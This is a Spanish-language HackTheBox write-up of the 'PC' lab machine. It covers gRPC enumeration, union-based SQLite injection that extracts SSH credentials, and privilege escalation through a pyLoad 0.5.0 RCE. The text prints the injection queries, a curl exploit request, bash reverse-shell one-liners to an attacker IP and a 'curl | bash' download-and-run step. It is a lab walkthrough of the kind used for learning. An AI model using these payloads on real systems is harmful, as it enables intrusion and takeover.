---
title: "PC"
date: 2025-05-29 16:41:41 +0200
categories: writeups HackTheBox
tags: gRPC inyecciónsql cve rce máquina internalservice pyload portforwarding linux sqlite3
description: Writeup de la máquina PC de Hackthebox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Reconocimiento

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script ****whichSystem.py**** podremos conocer dicha información.

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105203212.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.214`.
### Nmap

En segundo lugar, realizaremos un escaneo usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.11.214 -oG allPorts
```

Observamos como nos reporta que se encuentran abiertos los puertos **22 y 50051**.

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105203338.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,50051 -sCV 10.10.11.214 -oN targeted
```

En la captura de **Nmap** observamos que el puerto **50051** está alojando un servicio el cual desconocemos.

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105203423.png>)
___
## Explotación

Como tenemos tan pocas opciones investigaremos sobre lo que se está alojando en el puerto **50051** ya que tal y como observamos a continuación se están mostrando información binaria: 

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105204618.png>)

Buscaremos información sobre el puerto **50051** y aparentemente parece que corresponde al protocolo **gRPC**:

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105205027.png>)

La definición de **ChatGPT** sobre este protocolo (**gRPC**) es la siguiente:

> "**_gRPC** es un protocolo el cual a su vez es un moderna implementación de **RPC** desarrollada por Google, que permite la comunicación eficiente entre servicios mediante HTTP/2 y Protocol Buffers (Protobuf). A diferencia del **RPC** tradicional, que suele usar formatos más pesados como JSON/XML y protocolos menos avanzados como HTTP/1.1, en conclusión **gRPC** es más rápido, eficiente y fácil de implementar en sistemas distribuidos y multiplataforma.

Una vez tenemos claro ante lo que estamos podemos llegar a la conclusión que de forma general el protocolo **gRPC** funciona de manera **"similar"** al de una **API REST**. Tras un rato buscando nos daremos cuenta que necesitamos la herramienta **grpcurl** para poder interactuar con **gRPC**, dicha herramienta no es conveniente usarla si es nuestra primera vez ante este protocolo.

Finalmente, nos toparemos con la herramienta **grpcui** la cual nos permite interactuar con **gRPC** pero vía web lo cual nos ayudará a familiarizarnos un poco más con este protocolo.

La forma más sencilla de instalarnos está herramienta es con el siguiente comando siempre y cuando tengamos instalado **go** ([Instalar Go](https://go.dev/doc/install)):

```bash
go install github.com/fullstorydev/grpcui/cmd/grpcui@latest
```

Para iniciar la herramienta debemos de ejecutar el siguiente comando:

```bash
grpcui -plaintext 10.10.11.214:50051
```

Observamos que se nos ha desplegado una página web por un puerto aleatorio (**http\://127.0.0.1:36035**):

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105225508.png>)

El aspecto de la página web es el siguiente:

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105230209.png>)

Siempre que estemos ante este protocolo (**gRPC**) debemos de conocer los **servicios** que contiene junto con sus respectivos **métodos**. 

Tal y como vemos a continuación el protocolo **gRPC** tan solo tiene el servicio **SimpleApp** el cual tiene los siguiente métodos (**LoginUser**, **RegisterUser**, **getInfo**):

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105230637.png>)

Una vez que conocemos el servicio y sus métodos seleccionaremos el método (**RegisterUser**) para registrar un nuevo usuario, como información enviaremos el usuario (**terror**) junto con la contraseña (**terror123**) y le daremos a **Invoke**:

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105231628.png>)

Tal y como vemos a continuación veremos que en la respuesta a la anterior petición nos dice que se ha creado una cuenta para el usuario **terror**:

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105231714.png>)

Ahora usaremos el método **LoginUser** para logearnos con dichas credenciales (**terror:terror123**) y veremos que en la respuesta nos devuelve un **token** y un **id**:

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105232059.png>)

Una vez que tenemos el **token** y el **id** podemos usar el último método restante (**getInfo**) el cual nos pide un **id** y adicionalmente debemos de pasarle el **token** tal que así:

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105232231.png>)

En la respuesta veremos que nos dice **_Will update soon_**:

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105232251.png>)
### SQL Injection

Tras estar un buen tiempo probando diferentes formas de ganar acceso a la máquina víctima se me ocurre probar una **SQL Injection** tal que así:

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105232435.png>)

Veremos como en mensaje me muestra **1** por lo que es vulnerable a una **Inyección SQL basada en uniones**.

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105232442.png>)

A continuación, probaré a mostrar el nombre de la base de datos gracias a la siguiente petición: `190 union select database()`, y tal y como vemos a continuación nos dará un error:

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105233202.png>)

Tras estar un buen rato pensado se me ocurre que es posible que la base de datos no sea **MySQL** por lo que probaré a ver si se trata de **SQLite**.

 Gracias al siguiente repositorio **SQLite - PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) podré obtener un [Payload** para saber si se trata de **SQLite**, en definitiva como cuerpo de la petición pondré lo siguiente: `190 union select sqlite_version();`, y tal y como vemos a continuación conseguimos ver la versión por lo que es **SQLite** lo que hay por detrás.

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105233524.png>)
#### Tablas

> Como estamos ante **SQLite** debemos de saber tener en cuenta que tan solo tenemos una **única** base de datos.

Usando el mismo repositorio de antes (**SQLite - PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)) comenzaré a enumerar las tablas con el siguiente [Payload**: `190 union SELECT sql FROM sqlite_master` pero en la respuesta veré me pone `None` por lo que se me ocurre usar `group_concat()` tal que así:

```sql
190 union SELECT group_concat(sql) FROM sqlite_master
```

Observamos como ahora si que nos mostrará las tables junto con sus correspondientes columnas:

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105234442.png>)
#### Filas de las columnas (información)

> Destacar que para mostrar las filas de las columnas, es decir la **información** es un poco más difícil ya que hay que usar un truco (**"||"**).
##### Tabla messages

En primer lugar, mostraremos la información referente a la tabla **messages** gracias a la siguiente consulta: 

```sql
190 union SELECT group_concat(username || ':' || message) FROM messages
```

En la respuesta veremos dos mensajes insignificantes y además uno de ellos corresponde a nuestro usuario.

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250106001759.png>)
##### Tabla accounts

En segundo y último lugar mostraremos la información de la tabla **accounts** usando la siguiente consulta:

```sql
190 union SELECT group_concat(username || ':' || password) FROM accounts
```

Observamos como nos muestra nuestra contraseña y una correspondiente a un usuario llamado **sau**: **HereIsYourPassWord1431**.

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250106000423.png>)

Probaremos a autenticarnos a través de **ssh** usando dichas credenciales (**sau:HereIsYourPassWord1431**) y observamos como conseguimos acceder correctamente a la máquina víctima.

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250106000524.png>)

___
## Escalada de privilegios

> Destacar que para que nos funcione el <kbd>CTRL</kbd> + <kbd>L</kbd> (**clear**) debemos de hacer un `export TERM=xterm`.

Tras ganar acceso a la máquina víctima buscaremos por las típicas formas de elevar nuestros privilegios (**Sudoers**, **SUID**) pero no encontraremos nada interesante pero tras un rato buscando veremos que hay un servicio interno corriendo en el puerto **8000** por lo que veremos como podemos **abusar del servicio interno del sistema**.

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105213748.png>)

En este punto debemos de realizar **Port Forwarding** para traernos el puerto **8000** a nuestra máquina de atacante, esto lo lograremos con el siguiente comando gracias a **ssh**:

```bash
ssh sau@10.10.11.214 -L 8000:127.0.0.1:8000
```

Gracias al **Port Forwarding** observaremos que al acceder a nuestro puerto **8000** (**localhost:8000**) podemos ver la página web de la máquina víctima alojada en dicho puerto (**8000**).

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105214304.png>)

Lo primero que se me ocurre es buscar la versión para este servicio (**pyLoad**) pero no conseguiremos verla por lo que buscaremos en **searchsploit** un exploit para la versión **0.5.0** el cual nos permite **RCE**:

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105214917.png>)

Con suerte la versión de nuestro **pyLoad** es la **0.5.0** pero como ya hemos visto antes la única forma de saberlo es comprobando si es vulnerable al exploit encontrado (**RCE**), por lo que nos descargaremos el exploit (`searchsploit -m python/webapps/51532.py`) y veremos que nos pide los siguientes parámetros:

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105215348.png>)

Al ejecutar el exploit con los parámetros correspondientes nos daremos cuenta que es una **Blind RCE**, es decir no somos capaces de ver el output del comando ejecutado:

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105215407.png>)

Una forma de comprobar que realmente se está ejecutando nuestro comando en una **Blind RCE** es enviándonos un ping a nuestra **Dirección IP** tras previamente habernos puesto en escucha por trazas **ICMP** (`tcpdump -i tun0 icmp -n`).

A continuación, veremos como al enviarnos un ping a nuestra **Dirección IP** recibiremos un paquete **ICMP** correspondiente a la **Dirección IP** de la máquina víctima.

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105215853.png>)

Tras comprobar que tenemos ejecución remota de comandos (**RCE**) miraremos el código del exploit y nos daremos cuenta que se puede resumir en una simple petición **POST** mediante **curl**:

```bash
curl -X POST http://127.0.0.1:8000/flash/addcrypted2 -H 'Content-Type: application/x-www-form-urlencoded' -d 'jk=pyimport os;os.system("ping -c 1 10.10.14.10");f=function f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'
```

En este punto continuaremos con el exploit ya que es más cómodo pero de igual forma lograremos el acceso a la máquina a través de una **Reverse Shell**.

En primer lugar nos daremos cuenta que con el típico one liner de bash vamos a tener problemas a menos de que **URL Encodeemos** los **&** (`bash -c 'bash -i >%26 /dev/tcp/10.10.14.10/443 0>%261'`) pero en el caso de que no se nos ocurra esto siempre podemos recurrir a la forma que nunca falla:

1. Nos montarnos un servidor con python (`python3 -m http.server 80`) y crearemos un **index.html** con el siguiente contenido: 

```html
#!/bin/bash

bash -c "bash -i >& /dev/tcp/10.10.14.10/443 0>&1"
```

2. A continuación, debemos de realizar una petición a nuestro servidor web y concatenarle una **bash**, en definitiva ejecutar el siguiente comando: 

```bash
curl http://10.10.14.10 | bash
```

3. Finalmente, veremos como recibimos una consola como el usuario **root** por lo que habremos conseguido elevar nuestros privilegios gracias al **Abuso del servicio interno del sistema**.

![](<../assets/images/posts/2025-05-29-pc/Pasted image 20250105221042.png>)